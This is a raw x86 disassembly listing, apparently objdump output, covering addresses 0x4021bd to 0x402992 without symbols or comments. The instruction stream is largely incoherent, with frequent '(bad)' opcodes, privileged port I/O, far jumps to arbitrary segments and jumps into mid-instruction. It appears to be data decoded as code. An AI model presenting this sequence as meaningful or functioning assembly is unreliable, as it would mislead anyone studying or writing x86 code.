  4021bd:	shr    BYTE PTR [esi+edx*8+0x47],cl
  4021c1:	xchg   ebx,eax
  4021c2:	sub    eax,DWORD PTR [ebx+0x255f869e]
  4021c8:	jo     0x40221a
  4021ca:	pop    edx
  4021cb:	jmp    0x402180
  4021cd:	cmp    cl,BYTE PTR [esi*1-0x750c9e9a]
  4021d4:	xchg   edx,eax
  4021d5:	xchg   BYTE PTR [esi+0x42],bh
  4021d8:	adc    BYTE PTR [esi],al
  4021da:	retf   
  4021db:	loope  0x402218
  4021dd:	push   ds
  4021de:	(bad)  
  4021e0:	inc    ebx
  4021e1:	je     0x4021a4
  4021e3:	cmc    
  4021e4:	ins    BYTE PTR es:[edi],dx
  4021e5:	movlps xmm1,QWORD PTR [ecx]
  4021e8:	cmp    esi,ebp
  4021ea:	jns    0x402248
  4021ec:	jb     0x4021c4
  4021ee:	jle    0x402220
  4021f0:	mul    BYTE PTR [edi+0x190e627c]
  4021f6:	push   cs
  4021f7:	mov    edx,0x56d7f25e
  4021fc:	ss popa 
  4021fe:	push   0xffffffa1
  402200:	jecxz  0x402251
  402202:	fist   WORD PTR [esi-0x5bb8c783]
  402208:	xchg   ecx,eax
  402209:	das    
  40220a:	inc    ebp
  40220b:	xchg   BYTE PTR [edx+0x3ea13831],ch
  402211:	or     edi,edx
  402213:	retf   
  402214:	outs   dx,BYTE PTR ds:[esi]
  402215:	aad    0x92
  402217:	scas   eax,DWORD PTR es:[edi]
  402218:	xchg   esp,eax
  402219:	jb     0x402272
  40221b:	cli    
  40221c:	in     eax,0xd0
  40221e:	bndstx [eax+0x7d],bnd0
  402222:	sub    eax,0x336f6a38
  402227:	push   ss
  402228:	or     DWORD PTR [edx+ebp*4+0x3b7bd8a1],esp
  40222f:	imul   esi,DWORD PTR [esi],0xffffff80
  402232:	and    al,0xef
  402234:	cmc    
  402235:	sbb    BYTE PTR [ebx-0x7c],bl
  402238:	das    
  402239:	(bad)  
  40223a:	out    dx,eax
  40223b:	out    dx,eax
  40223c:	adc    dl,BYTE PTR [bx+si-0x1a]
  402240:	(bad)  
  402243:	pop    ss
  402244:	mov    WORD PTR [esi*1-0x18dc2959],es
  40224b:	shl    DWORD PTR [eax+0x227c73bf],0x65
  402252:	mov    esp,0x9a1d3f81
  402257:	mov    eax,ds:0x62bf1278
  40225c:	mov    eax,DWORD PTR [ebx+0x25]
  40225f:	retf   
  402260:	int3   
  402261:	pop    ss
  402262:	cwde   
  402263:	pop    edx
  402264:	fiadd  DWORD PTR [ecx-0x9]
  402267:	or     BYTE PTR [ecx+0x79],bh
  40226a:	mov    edi,0xa81a0a7c
  40226f:	scas   al,BYTE PTR es:[edi]
  402270:	sub    bl,BYTE PTR [edx]
  402272:	js     0x4022e3
  402274:	mov    BYTE PTR [eax],bh
  402276:	mov    dh,0xbb
  402278:	rcr    DWORD PTR [eax+0x410c1adb],0x32
  40227f:	dec    edx
  402280:	repnz enter 0xd26f,0x87
  402285:	jmp    0x28dc:0x391d23d0
  40228c:	sti    
  40228d:	lods   eax,DWORD PTR ds:[esi]
  40228e:	loop   0x4022fc
  402290:	fstp   DWORD PTR [ebp-0x72]
  402293:	(bad)  
  402294:	jmp    0x40223e
  402296:	cwde   
  402297:	(bad)  
  402298:	lahf   
  402299:	jg     0x40227d
  40229b:	sub    DWORD PTR [edi-0x520dadb6],esi
  4022a1:	lahf   
  4022a2:	dec    ebp
  4022a3:	pop    edx
  4022a4:	jle    0x402246
  4022a6:	inc    ecx
  4022a7:	sbb    al,0x25
  4022a9:	mov    ecx,0x6951e339
  4022ae:	cmp    ecx,DWORD PTR [edi+0x4ea9266a]
  4022b4:	outs   dx,BYTE PTR ds:[esi]
  4022b5:	ja     0x40230f
  4022b7:	repnz mov ds:0x390eb027,al
  4022bd:	hlt    
  4022be:	jg     0x402284
  4022c0:	mov    dh,0x5a
  4022c2:	push   ebx
  4022c3:	jecxz  0x4022fe
  4022c5:	lea    ebp,[ebx]
  4022c7:	cmp    al,0xdf
  4022c9:	inc    esi
  4022ca:	jge    0x4022bb
  4022cc:	das    
  4022cd:	ret    
  4022ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022cf:	frstor ds:0x427740e3
  4022d5:	pop    ebp
  4022d6:	pop    ecx
  4022d7:	lods   eax,DWORD PTR ds:[esi]
  4022d8:	in     eax,0x4c
  4022da:	popf   
  4022db:	cmp    ah,BYTE PTR [edx-0x3f]
  4022de:	xor    DWORD PTR [edx+0x2e],ecx
  4022e1:	ins    DWORD PTR es:[edi],dx
  4022e2:	test   DWORD PTR [ecx+0x27428303],ecx
  4022e8:	mov    dh,BYTE PTR [esi-0x4b3a99ec]
  4022ee:	push   eax
  4022ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022f0:	jbe    0x402322
  4022f2:	add    BYTE PTR [ecx-0x1e],0x3d
  4022f6:	fchs   
  4022f8:	out    dx,eax
  4022f9:	imul   eax,DWORD PTR [edx-0x23],0xffffffac
  4022fd:	push   edi
  4022fe:	bound  ebp,QWORD PTR [edx+ebx*2+0x586c5b19]
  402305:	sbb    eax,0x7e57c43b
  40230a:	data16 jle 0x4022c4
  40230d:	mov    ds:0x9b43c68c,eax
  402312:	aas    
  402313:	mov    dh,0x4c
  402315:	call   0x17b887e0
  40231a:	idiv   ecx
  40231c:	ficom  WORD PTR [esi-0x7be989b]
  402322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402323:	mov    ecx,0x7abf3357
  402328:	scas   al,BYTE PTR es:[edi]
  402329:	not    BYTE PTR [edx]
  40232b:	shr    BYTE PTR [esi+0x479d5650],1
  402331:	in     eax,0x89
  402333:	cmp    BYTE PTR [ebx+0x2d],cl
  402336:	push   0xffffff89
  402338:	(bad)  
  402339:	xchg   ebx,eax
  40233a:	mov    ds:0xc3d52661,eax
  40233f:	cmp    ebx,DWORD PTR [esi+ebx*1+0x7b657ecd]
  402346:	cmc    
  402347:	call   0x6edf37b4
  40234c:	sub    edx,DWORD PTR [esi+0x60cef42f]
  402352:	mov    al,ds:0xf87c272a
  402357:	jecxz  0x402380
  402359:	stos   BYTE PTR es:[edi],al
  40235a:	sub    eax,0xc970cad5
  40235f:	neg    DWORD PTR [ebp-0x7d]
  402362:	jae    0x4022fe
  402364:	dec    edi
  402365:	mov    dl,0xaa
  402367:	xor    esp,DWORD PTR [ebx-0x44]
  40236a:	mov    WORD PTR [ecx+0x2],fs
  40236d:	lea    esi,[esi+0x43d947bd]
  402373:	add    DWORD PTR [ebp-0x7bf42ffe],ecx
  402379:	jnp    0x40238c
  40237b:	fdiv   st,st(2)
  40237d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40237e:	push   ebp
  40237f:	cmc    
  402380:	(bad)  
  402381:	cmp    ah,BYTE PTR ds:0x3155c683
  402387:	push   esp
  402388:	sub    eax,0xc33936c2
  40238d:	outs   dx,DWORD PTR ds:[esi]
  40238e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40238f:	sbb    DWORD PTR [eax],esp
  402391:	int    0x42
  402393:	neg    edx
  402395:	xchg   edx,eax
  402396:	jbe    0x402390
  402398:	loope  0x4023d6
  40239a:	push   cs
  40239b:	sar    DWORD PTR [edi+ebp*4+0x5ae887c5],1
  4023a2:	xchg   edx,eax
  4023a3:	fwait
  4023a4:	stos   DWORD PTR es:[edi],eax
  4023a5:	add    BYTE PTR [esi],bh
  4023a7:	ja     0x4023eb
  4023a9:	mov    ecx,0x6a1c2d4b
  4023ae:	inc    edx
  4023af:	xchg   ebx,eax
  4023b0:	inc    ebx
  4023b1:	outs   dx,DWORD PTR ds:[esi]
  4023b2:	lea    ecx,[edx]
  4023b4:	jae    0x402411
  4023b6:	jle    0x4023ea
  4023b8:	jg     0x4023c5
  4023ba:	xor    DWORD PTR [edx],0xeced369b
  4023c0:	shl    BYTE PTR [edx],1
  4023c2:	popw   ds
  4023c4:	inc    ebp
  4023c5:	pushf  
  4023c6:	sti    
  4023c7:	js     0x402364
  4023c9:	stos   DWORD PTR es:[edi],eax
  4023ca:	imul   ecx,DWORD PTR [ebx+edi*2-0x6],0xf58eb274
  4023d2:	adc    bh,BYTE PTR [esi]
  4023d4:	cmp    bl,dh
  4023d6:	push   ecx
  4023d7:	dec    esp
  4023d8:	add    eax,0xf40b9920
  4023dd:	and    ecx,DWORD PTR [ebp+0x24]
  4023e0:	push   ds
  4023e1:	test   eax,0x85a86510
  4023e6:	mov    ch,0xfa
  4023e8:	jb     0x402467
  4023ea:	jnp    0x402384
  4023ec:	sbb    edi,DWORD PTR [ebx-0x70]
  4023ef:	or     ecx,ecx
  4023f1:	cli    
  4023f2:	clc    
  4023f3:	xor    BYTE PTR ds:0x2b65f508,al
  4023f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023fa:	inc    edi
  4023fb:	aas    
  4023fc:	mov    edi,ebp
  4023fe:	or     DWORD PTR ds:0x34b0558a,eax
  402404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402405:	(bad)  
  402406:	mov    al,0x78
  402408:	test   DWORD PTR [esi+0x5b],ebp
  40240b:	jno    0x4023c5
  40240d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40240e:	in     eax,0xb6
  402410:	mov    ebx,0x5b2fffa
  402415:	jnp    0x40241f
  402417:	mov    dl,BYTE PTR [edi]
  402419:	out    0x4d,eax
  40241b:	lods   al,BYTE PTR ds:[esi]
  40241c:	in     eax,0x8c
  40241e:	mov    dh,0xcd
  402420:	dec    DWORD PTR [eax+0x770bbd86]
  402426:	outs   dx,BYTE PTR ds:[esi]
  402427:	test   BYTE PTR [edi+0x595e0184],dh
  40242d:	push   ebp
  40242e:	pop    edx
  40242f:	mov    al,0x85
  402431:	inc    eax
  402432:	(bad)  
  402433:	xchg   ebx,eax
  402434:	mov    esp,0x3c8672b7
  402439:	rol    DWORD PTR [edi],0x8a
  40243c:	sub    ebx,DWORD PTR [edi+edi*2+0x3b]
  402440:	loope  0x4023df
  402442:	in     al,dx
  402443:	mov    ds:0x90d0fda2,eax
  402448:	daa    
  402449:	push   ebp
  40244a:	cmc    
  40244b:	cmp    eax,0xc5c494a3
  402450:	push   0x57a2da0b
  402455:	dec    ebx
  402456:	cmp    DWORD PTR [esi],esp
  402458:	push   ebx
  402459:	sub    ch,BYTE PTR [esp+ecx*4+0x5ab1c588]
  402460:	cwde   
  402461:	ja     0x4024aa
  402463:	push   esp
  402464:	mov    dh,0x3
  402466:	and    BYTE PTR [esi+0x29],bh
  402469:	outs   dx,BYTE PTR ds:[esi]
  40246a:	pop    edx
  40246b:	mov    eax,ds:0x247ef0c
  402470:	(bad)  
  402471:	fldenv [edi]
  402473:	int3   
  402474:	stos   DWORD PTR es:[edi],eax
  402475:	(bad)  
  402476:	cmp    al,0x29
  402478:	jnp    0x4024f5
  40247a:	inc    ecx
  40247b:	out    dx,eax
  40247c:	into   
  40247d:	dec    edx
  40247e:	(bad)  
  40247f:	fdiv   QWORD PTR [esi]
  402481:	inc    edx
  402482:	or     eax,0x69e711e4
  402487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402488:	jecxz  0x4024ad
  40248a:	add    al,0x67
  40248c:	or     al,0x90
  40248e:	jmp    ecx
  402490:	adc    dh,BYTE PTR [ecx+ecx*8+0x4207f50c]
  402497:	stos   BYTE PTR es:[edi],al
  402498:	or     eax,0xf1e6fa58
  40249d:	jmp    0xd8c3:0xee281fed
  4024a4:	xchg   edi,eax
  4024a5:	dec    ecx
  4024a6:	dec    ecx
  4024a7:	icebp  
  4024a8:	int    0x59
  4024aa:	dec    edx
  4024ab:	popf   
  4024ac:	dec    ebx
  4024ad:	xor    ecx,DWORD PTR [ebx-0x5620ed10]
  4024b3:	aas    
  4024b4:	dec    esi
  4024b5:	cmp    al,BYTE PTR ss:[esi+0x5794aae5]
  4024bc:	mov    bl,0xd2
  4024be:	and    bl,ah
  4024c0:	rcr    BYTE PTR [edx-0x1030d14f],0x54
  4024c7:	xchg   ebx,eax
  4024c8:	das    
  4024c9:	mov    eax,ds:0x2fea5714
  4024ce:	inc    esi
  4024cf:	dec    ebx
  4024d0:	mov    ds:0x590b73fa,al
  4024d5:	ror    DWORD PTR [esi+0x65],0xb0
  4024d9:	dec    ebp
  4024da:	enter  0x2f7b,0x49
  4024de:	or     esi,DWORD PTR [ebx]
  4024e0:	mov    esp,0xd0ad9549
  4024e5:	pusha  
  4024e6:	and    al,0x2f
  4024e8:	(bad)  
  4024e9:	mov    ds:0x324412ca,al
  4024ee:	xlat   BYTE PTR ds:[ebx]
  4024ef:	aad    0x22
  4024f1:	push   eax
  4024f2:	fiadd  WORD PTR [edx]
  4024f4:	and    eax,DWORD PTR [ecx+0x5949c943]
  4024fa:	sar    bh,0x13
  4024fd:	pushf  
  4024fe:	mov    esi,0xfde743df
  402503:	addr16 push ss
  402505:	mov    edx,0x9e1fa903
  40250a:	xchg   ebx,eax
  40250b:	call   0x4f52:0x5df571d2
  402512:	adc    esp,esp
  402514:	in     al,0x5c
  402516:	cmp    cl,BYTE PTR [ebx]
  402518:	shl    BYTE PTR [eax+edx*1+0x5c526550],1
  40251f:	mov    ah,0x2a
  402521:	xchg   DWORD PTR [ebp-0x25],edx
  402524:	fdivr  QWORD PTR [edx]
  402526:	js     0x4024df
  402528:	pop    ss
  402529:	sahf   
  40252a:	pop    edi
  40252b:	cmp    eax,0xfd350c2f
  402530:	sub    eax,DWORD PTR [edi+esi*8]
  402533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402534:	outs   dx,BYTE PTR ds:[esi]
  402535:	mov    al,ds:0xb73881a3
  40253a:	add    bh,dh
  40253c:	ret    0xf8bf
  40253f:	cmp    ebx,ecx
  402541:	and    al,0x8a
  402543:	jmp    0x40255d
  402545:	cmc    
  402546:	outs   dx,DWORD PTR ds:[esi]
  402547:	mov    edx,fs
  402549:	pusha  
  40254a:	xor    bl,0x4
  40254d:	fstp   TBYTE PTR [edx+ebp*1-0x9aec9]
  402554:	hlt    
  402555:	out    0x89,al
  402557:	and    edx,esi
  402559:	cmp    ax,0xc62d
  40255d:	loope  0x402585
  40255f:	xlat   BYTE PTR ds:[ebx]
  402560:	call   0x85b9:0xc4451780
  402567:	test   DWORD PTR [edx-0x619ce9b],ebp
  40256d:	gs out dx,al
  40256f:	in     eax,0x32
  402571:	test   DWORD PTR [esi-0x15],0x7118cee3
  402578:	das    
  402579:	dec    ebx
  40257a:	jo     0x4025d0
  40257c:	mov    edi,0xcbf314f
  402581:	or     al,0x83
  402583:	push   esp
  402584:	int    0x24
  402586:	sbb    BYTE PTR [ecx-0x2a],bh
  402589:	int    0x9b
  40258b:	aam    0x6
  40258d:	xor    bh,dl
  40258f:	jns    0x40260d
  402591:	pop    ss
  402592:	(bad)  
  402593:	lahf   
  402594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402595:	cli    
  402596:	imul   ebp,ebp,0x2c6a0547
  40259c:	inc    esp
  40259d:	xchg   DWORD PTR [ecx+0x6],ebp
  4025a0:	loope  0x402620
  4025a2:	inc    esp
  4025a3:	mov    esp,0x6dd30eee
  4025a8:	cmc    
  4025a9:	mov    WORD PTR [ecx],?
  4025ab:	and    DWORD PTR [edi],ebp
  4025ad:	ret    
  4025ae:	xchg   ebx,eax
  4025af:	loopne 0x402563
  4025b1:	mov    DWORD PTR [eax+0x4153efd2],edi
  4025b7:	mov    dh,0x53
  4025b9:	push   ds
  4025ba:	jle    0x4025b8
  4025bc:	and    esi,DWORD PTR [eax-0x31da47d0]
  4025c2:	(bad)  
  4025c3:	fwait
  4025c4:	clc    
  4025c5:	push   esp
  4025c6:	dec    ebx
  4025c7:	add    edi,DWORD PTR [ecx]
  4025c9:	addr16 push esi
  4025cb:	lods   al,BYTE PTR ds:[esi]
  4025cc:	aas    
  4025cd:	in     al,0xd5
  4025cf:	nop
  4025d0:	jmp    0x402560
  4025d2:	xchg   BYTE PTR es:[bx-0x4ad6],bh
  4025d8:	shl    BYTE PTR [ecx],1
  4025da:	sbb    DWORD PTR [edi],ebp
  4025dc:	xor    ebp,DWORD PTR [edi+0x8]
  4025df:	stos   DWORD PTR es:[edi],eax
  4025e0:	adc    al,0x75
  4025e2:	rcr    BYTE PTR [ecx+0x5de2912f],cl
  4025e8:	mov    eax,0x4642804e
  4025ed:	icebp  
  4025ee:	jo     0x402586
  4025f0:	(bad)  
  4025f1:	out    0x51,al
  4025f3:	add    al,0x28
  4025f5:	inc    ecx
  4025f6:	sbb    al,0x54
  4025f8:	jecxz  0x4025cf
  4025fa:	adc    bl,dl
  4025fc:	std    
  4025fd:	(bad)  
  4025fe:	jmp    0x81:0x361fbba5
  402605:	jecxz  0x4025cb
  402607:	push   esp
  402608:	dec    edx
  402609:	fisttp QWORD PTR [eax]
  40260b:	or     BYTE PTR [ecx-0x51],0xe1
  40260f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402610:	fisub  WORD PTR [edx-0x752a0c87]
  402616:	into   
  402617:	add    ch,bh
  402619:	ror    DWORD PTR [esi+0x62],1
  40261c:	sub    DWORD PTR [ebp-0x3c2a391c],edi
  402622:	bound  edx,QWORD PTR ss:[edi]
  402625:	mov    ebx,0xd8921a95
  40262a:	inc    edx
  40262b:	xor    DWORD PTR [ecx+0x4f],eax
  40262e:	dec    esi
  40262f:	pop    DWORD PTR ds:0x1bf62b09
  402635:	and    bh,BYTE PTR [esi]
  402637:	enter  0x1af6,0x96
  40263b:	push   0x3a
  40263d:	inc    esp
  40263e:	and    ah,al
  402640:	dec    edi
  402641:	cmp    eax,0x6f31fae9
  402646:	inc    esi
  402647:	call   0x56c0:0x601aa6f
  40264e:	aad    0x1b
  402650:	or     eax,0x6b5cb6e5
  402655:	mov    al,0xc
  402657:	adc    al,0x4a
  402659:	addr16 loop 0x4026d8
  40265c:	loope  0x4025e4
  40265e:	sbb    eax,0xd3c57fca
  402663:	inc    ecx
  402664:	outs   dx,DWORD PTR ds:[esi]
  402665:	adc    DWORD PTR [edi+edi*1],edi
  402668:	pop    esi
  402669:	dec    ecx
  40266a:	fcom   QWORD PTR [esi+0x2a]
  40266d:	push   0xfffffff7
  40266f:	int3   
  402670:	jl     0x402669
  402672:	nop
  402673:	cmp    eax,DWORD PTR [edx+eiz*4+0x6c]
  402677:	retf   0xb92d
  40267a:	test   BYTE PTR [esi+0x41c477de],cl
  402680:	repz data16 aam 0x44
  402684:	jp     0x402704
  402686:	and    eax,ebp
  402688:	mov    cl,0xc
  40268a:	jae    0x4026fa
  40268c:	inc    eax
  40268d:	sbb    al,0x33
  40268f:	xchg   esi,eax
  402690:	xor    esp,DWORD PTR [esi+esi*8]
  402693:	pushf  
  402694:	cwde   
  402695:	mov    edi,0xb2d0cd7f
  40269a:	mov    ds:0x2425d94c,eax
  40269f:	arpl   WORD PTR [ecx],dx
  4026a1:	call   0xa4117d54
  4026a6:	into   
  4026a7:	leave  
  4026a8:	loope  0x4026a2
  4026aa:	or     eax,0xffa12a7
  4026af:	arpl   WORD PTR [ebp+ebp*4+0x72bf0ccc],di
  4026b6:	outs   dx,BYTE PTR ds:[esi]
  4026b7:	push   es
  4026b8:	lock fst QWORD PTR [ebp-0x40]
  4026bc:	in     al,dx
  4026bd:	jae    0x40267f
  4026bf:	leave  
  4026c0:	add    ebp,DWORD PTR [esi]
  4026c2:	inc    edx
  4026c3:	xor    BYTE PTR [esi+0x29],al
  4026c6:	or     bl,bl
  4026c8:	adc    esi,DWORD PTR [eax-0x2f43dc8b]
  4026ce:	xor    bl,dh
  4026d0:	push   esp
  4026d1:	push   ds
  4026d2:	div    DWORD PTR [esi+ebp*1+0x10c36048]
  4026d9:	les    edi,FWORD PTR [ebx]
  4026db:	dec    esp
  4026dc:	gs ret 
  4026de:	ss out 0x30,eax
  4026e1:	inc    edi
  4026e2:	lds    ebx,FWORD PTR [edx-0x783ecbf4]
  4026e8:	in     al,0x80
  4026ea:	push   ecx
  4026eb:	lds    esi,FWORD PTR [edi-0x6a951d77]
  4026f1:	stos   DWORD PTR es:[edi],eax
  4026f2:	add    DWORD PTR [ebx],0xa
  4026f5:	mov    ds:0x44553904,eax
  4026fa:	jae    0x40268c
  4026fc:	imul   esp,DWORD PTR [edi+0x6],0x170fa541
  402703:	je     0x4026ab
  402705:	sbb    BYTE PTR [eax],bl
  402707:	xchg   edi,eax
  402708:	jmp    0x3a90:0xb05dd80c
  40270f:	sub    al,0xe9
  402711:	mov    WORD PTR [ecx+0x67aae519],ds
  402717:	push   edi
  402718:	rol    BYTE PTR [edi+ebx*1+0x633e6bb1],cl
  40271f:	jg     0x402758
  402721:	cwde   
  402722:	or     al,0x95
  402724:	adc    dh,BYTE PTR [esi+0x1a]
  402727:	shr    DWORD PTR [ebx],0x49
  40272a:	sub    esp,DWORD PTR [edi+0x5f60f060]
  402730:	add    BYTE PTR ds:0x6591ccb0,bl
  402736:	mov    ah,0x7
  402738:	xchg   DWORD PTR [ecx],ebx
  40273a:	mov    dh,BYTE PTR [esi-0x3e22ac43]
  402740:	mov    eax,0xe3fba667
  402745:	mov    dh,0x63
  402747:	and    DWORD PTR [edi+ebp*4],ebx
  40274a:	shl    BYTE PTR [edi+0x47f18a7f],1
  402750:	(bad)  [ebx]
  402752:	jle    0x4026fc
  402754:	xor    eax,0xb0b26364
  402759:	adc    ecx,ecx
  40275b:	sub    al,0x5c
  40275d:	xor    DWORD PTR [edi-0x12],ecx
  402760:	dec    edx
  402761:	mov    eax,0x15ef4d15
  402766:	sbb    eax,eax
  402768:	push   eax
  402769:	xchg   al,cl
  40276b:	jbe    0x40279f
  40276d:	leave  
  40276e:	mov    bh,0xf0
  402770:	jmp    0x402735
  402772:	stos   DWORD PTR es:[edi],eax
  402773:	inc    ecx
  402774:	addr16 add al,0x65
  402777:	pop    edx
  402778:	vucomisd xmm7,xmm5
  40277c:	ror    DWORD PTR [eax],1
  40277e:	adc    BYTE PTR [edx-0x64039a07],bh
  402784:	rcr    BYTE PTR [esi+0x47],0xfd
  402788:	jb     0x4027c8
  40278a:	or     eax,0x8729a809
  40278f:	fwait
  402790:	enter  0x9168,0xb1
  402794:	es dec edx
  402796:	ins    DWORD PTR es:[edi],dx
  402797:	js     0x4027e0
  402799:	pop    esp
  40279a:	sub    BYTE PTR [eax+0x70],cl
  40279d:	call   0x25c8:0x3eb40c57
  4027a4:	int    0x45
  4027a6:	inc    esp
  4027a7:	add    dl,BYTE PTR [edx+0x10]
  4027aa:	xchg   edi,eax
  4027ab:	or     al,0x5b
  4027ad:	or     eax,0x8e006a30
  4027b2:	push   esi
  4027b3:	mov    ebx,0xd3538df1
  4027b8:	test   edi,esi
  4027ba:	ja     0x40282c
  4027bc:	fwait
  4027bd:	xchg   esi,eax
  4027be:	xor    cl,BYTE PTR [edx-0x3e]
  4027c1:	adc    BYTE PTR ds:0x7d3ceb71,bl
  4027c7:	jmp    0x1ae5:0x6fec4d44
  4027ce:	dec    ebx
  4027cf:	outs   dx,DWORD PTR ds:[esi]
  4027d0:	cmp    al,0x94
  4027d2:	fidiv  DWORD PTR [ecx]
  4027d4:	imul   esi,DWORD PTR [ebp+0x61f15520],0xffffff80
  4027db:	test   eax,0xf74385b7
  4027e0:	dec    ebx
  4027e1:	jo     0x402770
  4027e3:	and    edi,esp
  4027e5:	test   DWORD PTR [eax],edi
  4027e7:	inc    ebp
  4027e8:	mov    eax,ds:0x8b0f296a
  4027ed:	enter  0xd61b,0x91
  4027f1:	xchg   esp,eax
  4027f2:	in     eax,0xab
  4027f4:	push   ss
  4027f5:	sbb    DWORD PTR [eax-0x27675faf],eax
  4027fb:	xor    BYTE PTR [ecx],cl
  4027fd:	rol    cl,1
  4027ff:	add    eax,0xb7df67
  402804:	js     0x40280c
  402806:	mov    WORD PTR [eax],ds
  402808:	sti    
  402809:	dec    esp
  40280a:	ins    DWORD PTR es:[edi],dx
  40280b:	add    eax,0x36f57f25
  402810:	les    eax,FWORD PTR [ebx+0x7e]
  402813:	cdq    
  402814:	test   DWORD PTR [ebx+0x73],0xfacde114
  40281b:	test   DWORD PTR [edi-0x42],ebx
  40281e:	les    eax,FWORD PTR [edx]
  402820:	dec    eax
  402821:	sub    BYTE PTR [eax],dh
  402823:	mov    ah,0xf1
  402825:	adc    al,bh
  402827:	add    BYTE PTR [ebp+0x22],bh
  40282a:	(bad)  
  40282c:	sbb    DWORD PTR [esi-0x35],esi
  40282f:	jo     0x4027d2
  402831:	mov    esp,0xaf89c949
  402836:	inc    ebp
  402837:	jns    0x4027be
  402839:	cdq    
  40283a:	test   cl,0xf0
  40283d:	add    esp,DWORD PTR [edx+esi*1]
  402840:	out    dx,eax
  402841:	mov    ecx,0xc21f183d
  402846:	cmp    ebx,DWORD PTR [edi+0x12]
  402849:	fucomip st,st(2)
  40284b:	mov    eax,ds:0x5278bf61
  402850:	inc    ecx
  402851:	enter  0xe67b,0xe2
  402855:	shl    DWORD PTR [ebx+0x3b],1
  402858:	mov    ecx,eax
  40285a:	addr16 xchg edi,eax
  40285c:	hlt    
  40285d:	pop    ebx
  40285e:	pop    esp
  40285f:	xchg   esi,eax
  402860:	xlat   BYTE PTR ds:[ebx]
  402861:	inc    BYTE PTR [ebp-0x2e59eeda]
  402867:	sbb    ch,ah
  402869:	sub    DWORD PTR [ebx],0x3a193282
  40286f:	fld    QWORD PTR [ebp+0x14]
  402872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402873:	ret    
  402874:	rcl    DWORD PTR [edx+0xa2f7151],0x3b
  40287b:	ja     0x4028e4
  40287d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40287e:	mov    BYTE PTR [ecx],bh
  402880:	mov    ch,0x76
  402882:	outs   dx,BYTE PTR ds:[esi]
  402883:	(bad)  
  402885:	cmp    eax,eax
  402887:	mov    ebp,0x5f602037
  40288c:	sub    bl,BYTE PTR [esi]
  40288e:	ret    0xb9fa
  402891:	cmp    bh,0x8f
  402894:	jnp    0x402822
  402896:	aaa    
  402897:	mov    esi,DWORD PTR ds:0xc89bb065
  40289d:	adc    esp,DWORD PTR [eax+0x39]
  4028a0:	pop    edi
  4028a1:	push   0x27595bd0
  4028a6:	xchg   ebp,eax
  4028a7:	ss push edi
  4028a9:	jno    0x402920
  4028ab:	ins    DWORD PTR es:[edi],dx
  4028ac:	xchg   ebx,eax
  4028ad:	or     edx,DWORD PTR [edi-0x6e]
  4028b0:	pusha  
  4028b1:	stc    
  4028b2:	std    
  4028b3:	sbb    ah,BYTE PTR [edi]
  4028b5:	fnsave [ebx-0x55602171]
  4028bb:	push   esp
  4028bc:	inc    esp
  4028bd:	mov    esp,0x17674aa2
  4028c2:	gs xor al,0xeb
  4028c5:	mov    dl,0x83
  4028c7:	ss addr16 inc edx
  4028ca:	xlat   BYTE PTR ds:[ebx]
  4028cb:	push   esp
  4028cc:	shl    al,0x57
  4028cf:	(bad)  
  4028d0:	out    dx,al
  4028d1:	lods   eax,DWORD PTR ds:[esi]
  4028d2:	int    0x57
  4028d4:	ja     0x402858
  4028d6:	dec    eax
  4028d7:	inc    ebx
  4028d8:	cli    
  4028d9:	add    dl,BYTE PTR [eax-0xb]
  4028dc:	imul   ebp,DWORD PTR fs:[edx-0x1f56a920],0x6c559311
  4028e7:	mov    edi,0x87ffe979
  4028ec:	aas    
  4028ed:	scas   eax,DWORD PTR es:[edi]
  4028ee:	jmp    0xb6178943
  4028f3:	icebp  
  4028f4:	outs   dx,BYTE PTR ds:[esi]
  4028f5:	imul   ebx,DWORD PTR [ecx+0x31],0x73436f1d
  4028fc:	pusha  
  4028fd:	mov    dl,0x16
  4028ff:	dec    ecx
  402900:	sbb    BYTE PTR [ebx+edx*1],dl
  402903:	enter  0x5e32,0x9d
  402907:	pop    ds
  402908:	jnp    0x4028f8
  40290a:	or     BYTE PTR [esi+0x1c9e8704],0x5e
  402911:	add    al,0x86
  402913:	push   cs
  402914:	push   edi
  402915:	inc    ebp
  402916:	div    BYTE PTR [edx+0x0]
  402919:	sbb    edi,eax
  40291b:	sub    DWORD PTR [eax-0x50],esi
  40291e:	or     eax,0xc3c83fdf
  402923:	inc    ebx
  402924:	push   0x915c920b
  402929:	or     al,0x27
  40292b:	ret    0xd176
  40292e:	push   esi
  40292f:	cmp    ecx,DWORD PTR [ecx+eax*1]
  402932:	arpl   WORD PTR [eax-0x588a9337],cx
  402938:	test   al,0xc7
  40293a:	popf   
  40293b:	sub    edi,DWORD PTR [ebx-0x56264e59]
  402941:	iret   
  402942:	into   
  402943:	sbb    esp,DWORD PTR [edi+edi*2+0x1d2c552e]
  40294a:	in     al,dx
  40294b:	scas   al,BYTE PTR es:[edi]
  40294c:	push   esp
  40294d:	(bad)  
  40294e:	jle    0x402981
  402950:	in     eax,0xa5
  402952:	sub    al,0xf4
  402954:	idiv   dl
  402956:	push   ecx
  402957:	mov    dh,0x3f
  402959:	xor    al,0xec
  40295b:	xchg   DWORD PTR [ecx+0x6a4c7003],ecx
  402961:	jne    0x402957
  402963:	xor    eax,0x2a6dcb1f
  402968:	fs mov esi,0x70d4d3ec
  40296e:	mov    dl,0x51
  402970:	js     0x40299f
  402972:	mov    ecx,edx
  402974:	push   ebx
  402975:	ret    
  402976:	bound  esi,QWORD PTR [edi-0xb]
  402979:	repnz repnz lds esi,FWORD PTR [edi]
  40297d:	add    ah,BYTE PTR [edi+0x71]
  402980:	int3   
  402981:	inc    edi
  402982:	pop    esi
  402983:	add    al,0xf9
  402985:	data16 mov ch,0xb6
  402988:	test   eax,0xab1ae8de
  40298d:	adc    DWORD PTR gs:[ecx+0x74],0x41
  402992:	mov    bh,0xd7
